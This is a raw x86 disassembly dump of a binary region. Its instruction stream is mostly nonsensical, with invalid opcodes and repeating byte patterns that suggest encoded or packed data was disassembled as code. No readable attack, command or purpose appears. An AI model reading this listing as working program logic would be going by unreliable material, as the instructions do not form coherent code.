  4081b3:	01 5c 16 e0          	add    %ebx,-0x20(%esi,%edx,1)
  4081b7:	60                   	pusha
  4081b8:	2b 6d 68             	sub    0x68(%ebp),%ebp
  4081bb:	16                   	push   %ss
  4081bc:	e0 60                	loopne 0x40821e
  4081be:	88 32                	mov    %dh,(%edx)
  4081c0:	45                   	inc    %ebp
  4081c1:	5f                   	pop    %edi
  4081c2:	9f                   	lahf
  4081c3:	01 68 16             	add    %ebp,0x16(%eax)
  4081c6:	e0 60                	loopne 0x408228
  4081c8:	a1 65 b4 04 e0       	mov    0xe004b465,%eax
  4081cd:	60                   	pusha
  4081ce:	d3 20                	shll   %cl,(%eax)
  4081d0:	43                   	inc    %ebx
  4081d1:	28 56 a0             	sub    %dl,-0x60(%esi)
  4081d4:	a0 23 2d a0 a0       	mov    0xa0a02d23,%al
  4081d9:	b3 f6                	mov    $0xf6,%bl
  4081db:	eb 92                	jmp    0x40816f
  4081dd:	eb 78                	jmp    0x408257
  4081df:	eb a3                	jmp    0x408184
  4081e1:	48                   	dec    %eax
  4081e2:	b3 19                	mov    $0x19,%bl
  4081e4:	9f                   	lahf
  4081e5:	5f                   	pop    %edi
  4081e6:	43                   	inc    %ebx
  4081e7:	38 a6 a1 a0 e9 bd    	cmp    %ah,-0x42165f5f(%esi)
  4081ed:	30 a6 a1 a0 e9 d5    	xor    %ah,-0x2a165f5f(%esi)
  4081f3:	34 a6                	xor    $0xa6,%al
  4081f5:	a1 a0 27 a5 18       	mov    0x18a527a0,%eax
  4081fa:	56                   	push   %esi
  4081fb:	a0 a0 30 56 a0       	mov    0xa05630a0,%al
  408200:	a0 27 a5 1c 56       	mov    0x561ca527,%al
  408205:	a0 a0 30 7e a0       	mov    0xa07e30a0,%al
  40820a:	a0 27 a5 2c 56       	mov    0x562ca527,%al
  40820f:	a0 a0 60 c8 60       	mov    0x60c860a0,%al
  408214:	a0 93 60 03 68       	mov    0x68036093,%al
  408219:	16                   	push   %ss
  40821a:	e0 60                	loopne 0x40827c
  40821c:	67 65 54             	addr16 gs push %esp
  40821f:	16                   	push   %ss
  408220:	e0 60                	loopne 0x408282
  408222:	d4 cc                	aam    $0xcc
  408224:	e0 60                	loopne 0x408286
  408226:	67 65 50             	addr16 gs push %eax
  408229:	16                   	push   %ss
  40822a:	e0 60                	loopne 0x40828c
  40822c:	98                   	cwtl
  40822d:	cc                   	int3
  40822e:	e0 60                	loopne 0x408290
  408230:	9f                   	lahf
  408231:	75 54                	jne    0x408287
  408233:	16                   	push   %ss
  408234:	e0 60                	loopne 0x408296
  408236:	fe                   	(bad)
  408237:	bb 63 e3 dd 28       	mov    $0x28dde363,%ebx
  40823c:	56                   	push   %esi
  40823d:	a0 a0 60 1e 65       	mov    0x651e60a0,%al
  408242:	88 9a 9f 5f 9f 27    	mov    %bl,0x279f5f9f(%edx)
  408248:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408249:	70 44                	jo     0x40828f
  40824b:	a0 a0 61 a0 60       	mov    0x60a061a0,%al
  408250:	a0 27 a5 74 44       	mov    0x4474a527,%al
  408255:	a0 a0 61 a0 60       	mov    0x60a061a0,%al
  40825a:	a0 93 60 03 60       	mov    0x60036093,%al
  40825f:	16                   	push   %ss
  408260:	e0 60                	loopne 0x4082c2
  408262:	d3 20                	shll   %cl,(%eax)
  408264:	43                   	inc    %ebx
  408265:	24 56                	and    $0x56,%al
  408267:	a0 a0 93 60 03       	mov    0x36093a0,%al
  40826c:	68 16 e0 60 d3       	push   $0xd360e016
  408271:	20 43 2c             	and    %al,0x2c(%ebx)
  408274:	56                   	push   %esi
  408275:	a0 a0 c6 67 65       	mov    0x6567c6a0,%al
  40827a:	b8 04 e0 60 a0       	mov    $0xa060e004,%eax
  40827f:	60                   	pusha
  408280:	66 65 bc 04 e0       	gs mov $0xe004,%sp
  408285:	60                   	pusha
  408286:	a0 c6 67 65 c0       	mov    0xc06567c6,%al
  40828b:	04 e0                	add    $0xe0,%al
  40828d:	60                   	pusha
  40828e:	a0 60 06 27 a5       	mov    0xa5270660,%al
  408293:	84 44 a0 a0          	test   %al,-0x60(%eax,%eiz,4)
  408297:	60                   	pusha
  408298:	a0 23 2d a0 a0       	mov    0xa0a02d23,%al
  40829d:	b5 2b                	mov    $0x2b,%ch
  40829f:	4c                   	dec    %esp
  4082a0:	23 24 98             	and    (%eax,%ebx,4),%esp
  4082a3:	b3 f6                	mov    $0xf6,%bl
  4082a5:	b7 29                	mov    $0x29,%bh
  4082a7:	b5 98                	mov    $0x98,%ch
  4082a9:	e9 e5 5c 2b a5       	jmp    0xa56bdf93
  4082ae:	98                   	cwtl
  4082af:	48                   	dec    %eax
  4082b0:	65 16                	gs push %ss
  4082b2:	9f                   	lahf
  4082b3:	5f                   	pop    %edi
  4082b4:	2b a5 9c 48 dd 18    	sub    0x18dd489c(%ebp),%esp
  4082ba:	9f                   	lahf
  4082bb:	5f                   	pop    %edi
  4082bc:	25 20 14 9f d3       	and    $0xd39f1420,%eax
  4082c1:	20 f5                	and    %dh,%ch
  4082c3:	c8 04 ce e0          	enter  $0xce04,$0xe0
  4082c7:	60                   	pusha
  4082c8:	04 5f                	add    $0x5f,%al
  4082ca:	d0 c4                	rol    $1,%ah
  4082cc:	29 80 2b b5 98 ed    	sub    %eax,-0x12674ad5(%eax)
  4082d2:	e5 5c                	in     $0x5c,%eax
  4082d4:	88 60 9f             	mov    %ah,-0x61(%eax)
  4082d7:	5f                   	pop    %edi
  4082d8:	9f                   	lahf
  4082d9:	48                   	dec    %eax
  4082da:	7b 5c                	jnp    0x408338
  4082dc:	9f                   	lahf
  4082dd:	5f                   	pop    %edi
  4082de:	88 b6 9f 5f 9f 93    	mov    %dh,-0x6c60a061(%esi)
  4082e4:	60                   	pusha
  4082e5:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4082ea:	b0 4b                	mov    $0x4b,%al
  4082ec:	b2 49                	mov    $0x49,%dl
  4082ee:	3f                   	aas
  4082ef:	10 9f 5f 2b a5 98    	adc    %bl,-0x675ad4a1(%edi)
  4082f5:	48                   	dec    %eax
  4082f6:	1f                   	pop    %ds
  4082f7:	16                   	push   %ss
  4082f8:	9f                   	lahf
  4082f9:	5f                   	pop    %edi
  4082fa:	88 aa 52 5f 9f bf    	mov    %ch,-0x4060a0ae(%edx)
  408300:	fe                   	(bad)
  408301:	bb f9 b9 fd 23       	mov    $0x23fdb9f9,%ebx
  408306:	2d a0 a0 b5 2b       	sub    $0x2bb5a0a0,%eax
  40830b:	4c                   	dec    %esp
  40830c:	d3 20                	shll   %cl,(%eax)
  40830e:	f5                   	cmc
  40830f:	c8 45 ce e0          	enter  $0xce45,$0xe0
  408313:	60                   	pusha
  408314:	04 5f                	add    $0x5f,%al
  408316:	d0 c4                	rol    $1,%ah
  408318:	29 80 9f 65 4c 16    	sub    %eax,0x164c659f(%eax)
  40831e:	e0 60                	loopne 0x408380
  408320:	d3 20                	shll   %cl,(%eax)
  408322:	fa                   	cli
  408323:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  408328:	08 0c 0e             	or     %cl,(%esi,%ecx,1)
  40832b:	a0 a0 23 89 ea       	mov    0xea8923a0,%al
  408330:	51                   	push   %ecx
  408331:	5f                   	pop    %edi
  408332:	9f                   	lahf
  408333:	4b                   	dec    %ebx
  408334:	98                   	cwtl
  408335:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  40833a:	cd 0c                	int    $0xc
  40833c:	56                   	push   %esi
  40833d:	a0 a0 61 63 b3       	mov    0xb36361a0,%al
  408342:	f6 e3                	mul    %bl
  408344:	69 5f 2b 38 2b 22 e8 	imul   $0xe8222b38,0x2b(%edi),%ebx
  40834b:	e5 60                	in     $0x60,%eax
  40834d:	d2 c1                	rol    %cl,%cl
  40834f:	a0 d3 32 2a 73       	mov    0x732a32d3,%al
  408354:	2b 51 21             	sub    0x21(%ecx),%edx
  408357:	46                   	inc    %esi
  408358:	9f                   	lahf
  408359:	60                   	pusha
  40835a:	a0 60 d3 36 2b       	mov    0x2b36d360,%al
  40835f:	74 35                	je     0x408396
  408361:	8c 44 a0 a0          	mov    %es,-0x60(%eax,%eiz,4)
  408365:	21 89 68 d3 31 2b    	and    %ecx,0x2b31d368(%ecx)
  40836b:	2a e3                	sub    %bl,%ah
  40836d:	a8 15                	test   $0x15,%al
  40836f:	40                   	inc    %eax
  408370:	2b 21                	sub    (%ecx),%esp
  408372:	fe                   	(bad)
  408373:	bb 63 b5 2b 4c       	mov    $0x4c2bb563,%ebx
  408378:	f1                   	int1
  408379:	b3 f6                	mov    $0xf6,%bl
  40837b:	b7 2b                	mov    $0x2b,%bh
  40837d:	38 d3                	cmp    %dl,%bl
  40837f:	20 29                	and    %ch,(%ecx)
  408381:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408382:	9c                   	pushf
  408383:	93                   	xchg   %eax,%ebx
  408384:	72 b5                	jb     0x40833b
  408386:	08 bf 0f a0 a0 c4    	or     %bh,-0x3b5f5ff1(%edi)
  40838c:	9f                   	lahf
  40838d:	92                   	xchg   %eax,%edx
  40838e:	04 e9                	add    $0xe9,%al
  408390:	c2 18 cc             	ret    $0xcc18
  408393:	04 e0                	add    $0xe0,%al
  408395:	60                   	pusha
  408396:	5a                   	pop    %edx
  408397:	60                   	pusha
  408398:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408399:	60                   	pusha
  40839a:	a0 48 41 5f 9f       	mov    0x9f5f4148,%al
  40839f:	5f                   	pop    %edi
  4083a0:	97                   	xchg   %eax,%edi
  4083a1:	30 dd                	xor    %bl,%ch
  4083a3:	73 3e                	jae    0x4083e3
  4083a5:	2f                   	das
  4083a6:	0f d4 af 93 60 e9 e5 	paddq  -0x1a169f6d(%edi),%mm5
  4083ad:	5c                   	pop    %esp
  4083ae:	d3 20                	shll   %cl,(%eax)
  4083b0:	fa                   	cli
  4083b1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4083b6:	8b 9a 2b 23 88 9a    	mov    -0x6577dcd5(%edx),%ebx
  4083bc:	57                   	push   %edi
  4083bd:	5f                   	pop    %edi
  4083be:	9f                   	lahf
  4083bf:	e5 60                	in     $0x60,%eax
  4083c1:	de b8 eb 63 48 cf    	fidivrs -0x30b79c15(%eax)
  4083c7:	17                   	pop    %ss
  4083c8:	9f                   	lahf
  4083c9:	5f                   	pop    %edi
  4083ca:	f0 eb 63             	lock jmp 0x408430
  4083cd:	48                   	dec    %eax
  4083ce:	bf 19 9f 5f fa       	mov    $0xfa5f9f19,%edi
  4083d3:	48                   	dec    %eax
  4083d4:	09 5f 9f             	or     %ebx,-0x61(%edi)
  4083d7:	5f                   	pop    %edi
  4083d8:	29 a5 9c 57 f5 5c    	sub    %esp,0x5cf5579c(%ebp)
  4083de:	d3 20                	shll   %cl,(%eax)
  4083e0:	fa                   	cli
  4083e1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4083e6:	8b 6a 89             	mov    -0x77(%edx),%ebp
  4083e9:	04 4f                	add    $0x4f,%al
  4083eb:	5f                   	pop    %edi
  4083ec:	9f                   	lahf
  4083ed:	48                   	dec    %eax
  4083ee:	f7 11                	notl   (%ecx)
  4083f0:	9f                   	lahf
  4083f1:	5f                   	pop    %edi
  4083f2:	2b a5 9c bf fe bb    	sub    -0x44014064(%ebp),%esp
  4083f8:	f9                   	stc
  4083f9:	bd 63 eb 60 b5       	mov    $0xb560eb63,%ebp
  4083fe:	2b 4c d3 20          	sub    0x20(%ebx,%edx,8),%ecx
  408402:	f5                   	cmc
  408403:	c8 39 cf e0          	enter  $0xcf39,$0xe0
  408407:	60                   	pusha
  408408:	04 5f                	add    $0x5f,%al
  40840a:	d0 c4                	rol    $1,%ah
  40840c:	29 80 9f 65 e4 88    	sub    %eax,-0x771b9a61(%eax)
  408412:	e1 60                	loope  0x408474
  408414:	d3 20                	shll   %cl,(%eax)
  408416:	fa                   	cli
  408417:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  40841c:	08 00                	or     %al,(%eax)
  40841e:	0f a0                	push   %fs
  408420:	a0 23 89 f6 50       	mov    0x50f68923,%al
  408425:	5f                   	pop    %edi
  408426:	9f                   	lahf
  408427:	4b                   	dec    %ebx
  408428:	98                   	cwtl
  408429:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  40842e:	cd a4                	int    $0xa4
  408430:	c8 a1 a0 61          	enter  $0xa0a1,$0x61
  408434:	63 10                	arpl   %edx,(%eax)
  408436:	0f a0                	push   %fs
  408438:	a0 71 a2 8e d1       	mov    0xd18ea271,%al
  40843d:	7a a0                	jp     0x4083df
  40843f:	60                   	pusha
  408440:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  408445:	5f                   	pop    %edi
  408446:	9f                   	lahf
  408447:	5f                   	pop    %edi
  408448:	9f                   	lahf
  408449:	60                   	pusha
  40844a:	a0 60 a0 6e 0c       	mov    0xc6ea060,%al
  40844f:	c4 0e                	les    (%esi),%ecx
  408451:	b3 14                	mov    $0x14,%bl
  408453:	c5 07                	lds    (%edi),%eax
  408455:	ad                   	lods   %ds:(%esi),%eax
  408456:	01 ce                	add    %ecx,%esi
  408458:	01 c7                	add    %eax,%edi
  40845a:	05 d2 30 38 0f       	add    $0xf3830d2,%eax
  40845f:	a0 a0 6e ac b4       	mov    0xb4ac6ea0,%al
  408464:	ec                   	in     (%dx),%al
  408465:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408466:	ee                   	out    %al,(%dx)
  408467:	b3 14                	mov    $0x14,%bl
  408469:	c5 07                	lds    (%edi),%eax
  40846b:	a9 0e c6 0f 6a       	test   $0x6a0fc60e,%eax
  408470:	a0 60 a0 61 a0       	mov    0xa061a060,%al
  408475:	60                   	pusha
  408476:	a0 0c 0f a0 a0       	mov    0xa0a00f0c,%al
  40847b:	66 a0 60 a0 eb 60    	data16 mov 0x60eba060,%al
  408481:	b5 2b                	mov    $0x2b,%ch
  408483:	4c                   	dec    %esp
  408484:	23 24 90             	and    (%eax,%edx,4),%esp
  408487:	b3 f6                	mov    $0xf6,%bl
  408489:	b7 2b                	mov    $0x2b,%bh
  40848b:	38 66 a5             	cmp    %ah,-0x5b(%esi)
  40848e:	9f                   	lahf
  40848f:	60                   	pusha
  408490:	d3 20                	shll   %cl,(%eax)
  408492:	f5                   	cmc
  408493:	c8 ef d0 e0          	enter  $0xd0ef,$0xe0
  408497:	60                   	pusha
  408498:	04 5f                	add    $0x5f,%al
  40849a:	d0 c4                	rol    $1,%ah
  40849c:	29 80 2b 23 88 b4    	sub    %eax,-0x4b77dcd5(%eax)
  4084a2:	56                   	push   %esi
  4084a3:	5f                   	pop    %edi
  4084a4:	9f                   	lahf
  4084a5:	e3 98                	jecxz  0x40843f
  4084a7:	6c                   	insb   (%dx),%es:(%edi)
  4084a8:	1c 84                	sbb    $0x84,%al
  4084aa:	2b 23                	sub    (%ebx),%esp
  4084ac:	88 a8 56 5f 9f a0    	mov    %ch,-0x5f60a0aa(%eax)
  4084b2:	2d a4 a3 53 2d       	sub    $0x2d53a3a4,%eax
  4084b7:	b5 93                	mov    $0x93,%ch
  4084b9:	19 ac 60 a0 60 88 32 	sbb    %ebp,0x328860a0(%eax,%eiz,2)
  4084c0:	42                   	inc    %edx
  4084c1:	5f                   	pop    %edi
  4084c2:	9f                   	lahf
  4084c3:	e1 1d                	loope  0x4084e2
  4084c5:	53                   	push   %ebx
  4084c6:	a0 60 9f 5f af       	mov    0xaf5f9f60,%al
  4084cb:	f4                   	hlt
  4084cc:	e5 5f                	in     $0x5f,%eax
  4084ce:	d3 20                	shll   %cl,(%eax)
  4084d0:	fa                   	cli
  4084d1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4084d6:	8b 6a 89             	mov    -0x77(%edx),%ebp
  4084d9:	14 4e                	adc    $0x4e,%al
  4084db:	5f                   	pop    %edi
  4084dc:	9f                   	lahf
  4084dd:	48                   	dec    %eax
  4084de:	07                   	pop    %es
  4084df:	10 9f 5f 2a a5 9f    	adc    %bl,-0x605ad5a1(%edi)
  4084e5:	bf fe bb 2b 45       	mov    $0x452bbbfe,%edi
  4084ea:	fd                   	std
  4084eb:	23 30                	and    (%eax),%esi
  4084ed:	b5 2b                	mov    $0x2b,%ch
  4084ef:	4c                   	dec    %esp
  4084f0:	23 24 70             	and    (%eax,%esi,2),%esp
  4084f3:	b3 f6                	mov    $0xf6,%bl
  4084f5:	b7 d3                	mov    $0xd3,%bh
  4084f7:	29 29                	sub    %ebp,(%ecx)
  4084f9:	ad                   	lods   %ds:(%esi),%eax
  4084fa:	78 e9                	js     0x4084e5
  4084fc:	ed                   	in     (%dx),%eax
  4084fd:	34 29                	xor    $0x29,%al
  4084ff:	ad                   	lods   %ds:(%esi),%eax
  408500:	70 e9                	jo     0x4084eb
  408502:	ed                   	in     (%dx),%eax
  408503:	40                   	inc    %eax
  408504:	29 ad 7c e9 ed 58    	sub    %ebp,0x58ede97c(%ebp)
  40850a:	29 b5 9c eb 78 93    	sub    %esi,-0x6c871464(%ebp)
  408510:	60                   	pusha
  408511:	b5 08                	mov    $0x8,%ch
  408513:	0a 12                	or     (%edx),%dl
  408515:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  40851a:	04 e9                	add    $0xe9,%al
  40851c:	c0 eb e5             	shr    $0xe5,%bl
  40851f:	5c                   	pop    %esp
  408520:	88 d8                	mov    %bl,%al
  408522:	a2 60 a0 93 60       	mov    %al,0x6093a060
  408527:	b5 08                	mov    $0x8,%ch
  408529:	d5 12                	aad    $0x12
  40852b:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  408530:	04 e9                	add    $0xe9,%al
  408532:	c0 ed f5             	shr    $0xf5,%ch
  408535:	3c 58                	cmp    $0x58,%al
  408537:	6c                   	insb   (%dx),%es:(%edi)
  408538:	a0 60 a0 48 51       	mov    0x5148a060,%al
  40853d:	2d 9f 5f 2b ad       	sub    $0xad2b5f9f,%eax
  408542:	7c ed                	jl     0x408531
  408544:	e5 40                	in     $0x40,%eax
  408546:	5a                   	pop    %edx
  408547:	20 12                	and    %dl,(%edx)
  408549:	a0 a0 48 95 15       	mov    0x159548a0,%al
  40854e:	9f                   	lahf
  40854f:	5f                   	pop    %edi
  408550:	2b b5 80 ed ed 58    	sub    0x58eded80(%ebp),%esi
  408556:	2b 23                	sub    (%ebx),%esp
  408558:	88 c8                	mov    %cl,%al
  40855a:	8a 5f 9f             	mov    -0x61(%edi),%bl
  40855d:	eb e5                	jmp    0x408544
  40855f:	58                   	pop    %eax
  408560:	88 7c 9f 5f          	mov    %bh,0x5f(%edi,%ebx,4)
  408564:	9f                   	lahf
  408565:	e4 60                	in     $0x60,%al
  408567:	6f                   	outsl  %ds:(%esi),(%dx)
  408568:	24 e7                	and    $0xe7,%al
  40856a:	a1 60 a0 ed e5       	mov    0xe5eda060,%eax
  40856f:	58                   	pop    %eax
  408570:	88 30                	mov    %dh,(%eax)
  408572:	57                   	push   %edi
  408573:	5f                   	pop    %edi
  408574:	9f                   	lahf
  408575:	ed                   	in     (%dx),%eax
  408576:	f5                   	cmc
  408577:	46                   	inc    %esi
  408578:	59                   	pop    %ecx
  408579:	6c                   	insb   (%dx),%es:(%edi)
  40857a:	a0 60 a0 48 b3       	mov    0xb348a060,%al
  40857f:	02 9f 5f 2b a5 8a    	add    -0x755ad4a1(%edi),%bl
  408585:	93                   	xchg   %eax,%ebx
  408586:	72 b2                	jb     0x40853a
  408588:	f0 ed                	lock in (%dx),%eax
  40858a:	e5 34                	in     $0x34,%eax
  40858c:	88 ac 6e 5f 9f 5f 15 	mov    %ch,0x155f9f5f(%esi,%ebp,2)
  408593:	34 08                	xor    $0x8,%al
  408595:	20 12                	and    %dl,(%edx)
  408597:	a0 a0 eb e5 4a       	mov    0x4ae5eba0,%al
  40859c:	a3 a5 8e a8 d3       	mov    %eax,0xd3a88ea5
  4085a1:	32 f2                	xor    %dl,%dh
  4085a3:	b0 2d                	mov    $0x2d,%al
  4085a5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4085a6:	70 48                	jo     0x4085f0
  4085a8:	d1 2e                	shrl   $1,(%esi)
  4085aa:	9f                   	lahf
  4085ab:	5f                   	pop    %edi
  4085ac:	9f                   	lahf
  4085ad:	d5 70                	aad    $0x70
  4085af:	ed                   	in     (%dx),%eax
  4085b0:	e5 38                	in     $0x38,%eax
  4085b2:	5a                   	pop    %edx
  4085b3:	63 a0 60 a0 48 9d    	arpl   %esp,-0x62b75fa0(%eax)
  4085b9:	15 9f 5f 2b b5       	adc    $0xb52b5f9f,%eax
  4085be:	78 ed                	js     0x4085ad
  4085c0:	ed                   	in     (%dx),%eax
  4085c1:	58                   	pop    %eax
  4085c2:	2b 23                	sub    (%ebx),%esp
  4085c4:	88 5c 89 5f          	mov    %bl,0x5f(%ecx,%ecx,4)
  4085c8:	9f                   	lahf
  4085c9:	eb e5                	jmp    0x4085b0
  4085cb:	58                   	pop    %eax
  4085cc:	88 88 55 5f 9f f9    	mov    %cl,-0x660a0ab(%eax)
  4085d2:	f2 b0 2b             	repnz mov $0x2b,%al
  4085d5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4085d6:	8e 93 72 9b f4 84    	mov    -0x7b0b648e(%ebx),%ss
  4085dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4085dd:	d5 a3                	aad    $0xa3
  4085df:	9b                   	fwait
  4085e0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4085e1:	84 fa                	test   %bh,%dl
  4085e3:	b8 14 6d d3 20       	mov    $0x20d36d14,%eax
  4085e8:	fa                   	cli
  4085e9:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4085ee:	89 7d a1             	mov    %edi,-0x5f(%ebp)
  4085f1:	60                   	pusha
  4085f2:	a0 ed e5 58 88       	mov    0x8858e5ed,%al
  4085f7:	aa                   	stos   %al,%es:(%edi)
  4085f8:	57                   	push   %edi
  4085f9:	5f                   	pop    %edi
  4085fa:	9f                   	lahf
  4085fb:	ed                   	in     (%dx),%eax
  4085fc:	f5                   	cmc
  4085fd:	54                   	push   %esp
  4085fe:	59                   	pop    %ecx
  4085ff:	64 a0 60 a0 48 2d    	mov    %fs:0x2d48a060,%al
  408605:	01 9f 5f 21 dd 94    	add    %ebx,-0x6b22dea1(%edi)
  40860b:	60                   	pusha
  40860c:	a0 5f 9f d4 ad       	mov    0xadd49f5f,%al
  408611:	93                   	xchg   %eax,%ebx
  408612:	60                   	pusha
  408613:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  408618:	b0 49                	mov    $0x49,%al
  40861a:	92                   	xchg   %eax,%edx
  40861b:	60                   	pusha
  40861c:	a0 60 2d a5 98       	mov    0x98a52d60,%al
  408621:	48                   	dec    %eax
  408622:	bf 17 9f 5f 23       	mov    $0x235f9f17,%edi
  408627:	20 a4 ed f5 52 59 62 	and    %ah,0x625952f5(%ebp,%ebp,8)
  40862e:	a0 60 a0 48 ff       	mov    0xff48a060,%al
  408633:	01 9f 5f 06 e3 1d    	add    %ebx,0x1de3065f(%edi)
  408639:	52                   	push   %edx
  40863a:	a1 d3 ad 93 60       	mov    0x6093add3,%eax
  40863f:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  408644:	b0 49                	mov    $0x49,%al
  408646:	66 60                	pushaw
  408648:	a0 60 d3 20 f5       	mov    0xf520d360,%al
  40864d:	c8 d6 d2 e0          	enter  $0xd2d6,$0xe0
  408651:	60                   	pusha
  408652:	04 5f                	add    $0x5f,%al
  408654:	d0 c4                	rol    $1,%ah
  408656:	29 80 af 17 e5 52    	sub    %eax,0x52e517af(%eax)
  40865c:	f0 eb e5             	lock jmp 0x408644
  40865f:	5c                   	pop    %esp
  408660:	23 20                	and    (%eax),%esp
  408662:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408663:	19 a1 60 a0 60 2b    	sbb    %esp,0x2b60a060(%ecx)
  408669:	75 4c                	jne    0x4086b7
  40866b:	cf                   	iret
  40866c:	e0 60                	loopne 0x4086ce
  40866e:	88 c6                	mov    %al,%dh
  408670:	5e                   	pop    %esi
  408671:	5f                   	pop    %edi
  408672:	9f                   	lahf
  408673:	e3 64                	jecxz  0x4086d9
  408675:	64 af                	fs scas %es:(%edi),%eax
  408677:	17                   	pop    %ss
  408678:	15 52 ee e5 96       	adc    $0x96e5ee52,%eax
  40867d:	dc d6                	(bad)
  40867f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408680:	d3 3b                	sarl   %cl,(%ebx)
  408682:	0b 23                	or     (%ebx),%esp
  408684:	ba e3 60 66 e0       	mov    $0xe06660e3,%edx
  408689:	e9 e5 54 2d a5       	jmp    0xa56ddb73
  40868e:	98                   	cwtl
  40868f:	48                   	dec    %eax
  408690:	51                   	push   %ecx
  408691:	16                   	push   %ss
  408692:	9f                   	lahf
  408693:	5f                   	pop    %edi
  408694:	2b b5 94 ed e4 70    	sub    0x70e4ed94(%ebp),%esi
  40869a:	9f                   	lahf
  40869b:	cb                   	lret
  40869c:	73 6d                	jae    0x40870b
  40869e:	2b ad 9c eb e9 66    	sub    0x66e9eb9c(%ebp),%ebp
  4086a4:	2d 74 f1 19 ba       	sub    $0xba19f174,%eax
  4086a9:	60                   	pusha
  4086aa:	a0 60 88 44 40       	mov    0x40448860,%al
  4086af:	5f                   	pop    %edi
  4086b0:	9f                   	lahf
  4086b1:	a3 ee d5 6d 93       	mov    %eax,0x936dd5ee
  4086b6:	60                   	pusha
  4086b7:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4086bc:	b0 4b                	mov    $0x4b,%al
  4086be:	c1 49 6d 0c          	rorl   $0xc,0x6d(%ecx)
  4086c2:	9f                   	lahf
  4086c3:	5f                   	pop    %edi
  4086c4:	2b a5 9c 48 71 60    	sub    0x6071489c(%ebp),%esp
  4086ca:	a0 60 88 d8 4e       	mov    0x4ed88860,%al
  4086cf:	5f                   	pop    %edi
  4086d0:	9f                   	lahf
  4086d1:	93                   	xchg   %eax,%ebx
  4086d2:	60                   	pusha
  4086d3:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4086d8:	b0 4b                	mov    $0x4b,%al
  4086da:	d5 48                	aad    $0x48
  4086dc:	09 0e                	or     %ecx,(%esi)
  4086de:	9f                   	lahf
  4086df:	5f                   	pop    %edi
  4086e0:	2b a5 9c 27 a0 60    	sub    0x60a0279c(%ebp),%esp
  4086e6:	a0 5f 9f eb e5       	mov    0xe5eb9f5f,%al
  4086eb:	5c                   	pop    %esp
  4086ec:	06                   	push   %es
  4086ed:	eb f5                	jmp    0x4086e4
  4086ef:	52                   	push   %edx
  4086f0:	06                   	push   %es
  4086f1:	e9 f0 64 d3 20       	jmp    0x2113ebe6
  4086f6:	fa                   	cli
  4086f7:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4086fc:	8b 72 89             	mov    -0x77(%edx),%esi
  4086ff:	ee                   	out    %al,(%dx)
  408700:	4c                   	dec    %esp
  408701:	5f                   	pop    %edi
  408702:	9f                   	lahf
  408703:	eb e5                	jmp    0x4086ea
  408705:	5c                   	pop    %esp
  408706:	88 f2                	mov    %dh,%dl
  408708:	a0 60 a0 48 d9       	mov    0xd948a060,%al
  40870d:	0e                   	push   %cs
  40870e:	9f                   	lahf
  40870f:	5f                   	pop    %edi
  408710:	d3 20                	shll   %cl,(%eax)
  408712:	fa                   	cli
  408713:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  408718:	08 11                	or     %dl,(%ecx)
  40871a:	12 a0 a0 ed e5 30    	adc    0x30e5eda0(%eax),%ah
  408720:	5a                   	pop    %edx
  408721:	65 a0 60 a0 48 13    	mov    %gs:0x1348a060,%al
  408727:	12 9f 5f 2d a5 98    	adc    -0x675ad2a1(%edi),%bl
  40872d:	48                   	dec    %eax
  40872e:	e7 12                	out    %eax,$0x12
  408730:	9f                   	lahf
  408731:	5f                   	pop    %edi
  408732:	63 49 25             	arpl   %ecx,0x25(%ecx)
  408735:	0d 9f 5f 8b 43       	or     $0x438b5f9f,%eax
  40873a:	ff                   	(bad)
  40873b:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  408740:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  408743:	5f                   	pop    %edi
  408744:	9f                   	lahf
  408745:	61                   	popa
  408746:	a0 60 a0 8d a0       	mov    0xa08da060,%al
  40874b:	60                   	pusha
  40874c:	a0 b3 f6 b7 23       	mov    0x23b7f6b3,%al
  408751:	24 98                	and    $0x98,%al
  408753:	e9 ec 84 a4 e9       	jmp    0xe9e50c44
  408758:	b4 84                	mov    $0x84,%ah
  40875a:	2b 38                	sub    (%eax),%edi
  40875c:	2b a4 c4 64 88 c0 a0 	sub    -0x5f3f779c(%esp,%eax,8),%esp
  408763:	60                   	pusha
  408764:	a0 6f 57 b3 a4       	mov    0xa4b3576f,%al
  408769:	aa                   	stos   %al,%es:(%edi)
  40876a:	25 32 1c 88 e2       	and    $0xe2881c32,%eax
  40876f:	93                   	xchg   %eax,%ebx
  408770:	60                   	pusha
  408771:	cb                   	lret
  408772:	90                   	nop
  408773:	6d                   	insl   (%dx),%es:(%edi)
  408774:	2b ab a6 eb ac d1    	sub    -0x2e53145a(%ebx),%ebp
  40877a:	db 6c c4 d5          	fldt   -0x2b(%esp,%eax,8)
  40877e:	b3 eb                	mov    $0xeb,%bl
  408780:	eb 66                	jmp    0x4087e8
  408782:	2b dc                	sub    %esp,%ebx
  408784:	c4 64 2d 94          	les    -0x6c(%ebp,%ebp,1),%esp
  408788:	11 19                	adc    %ebx,(%ecx)
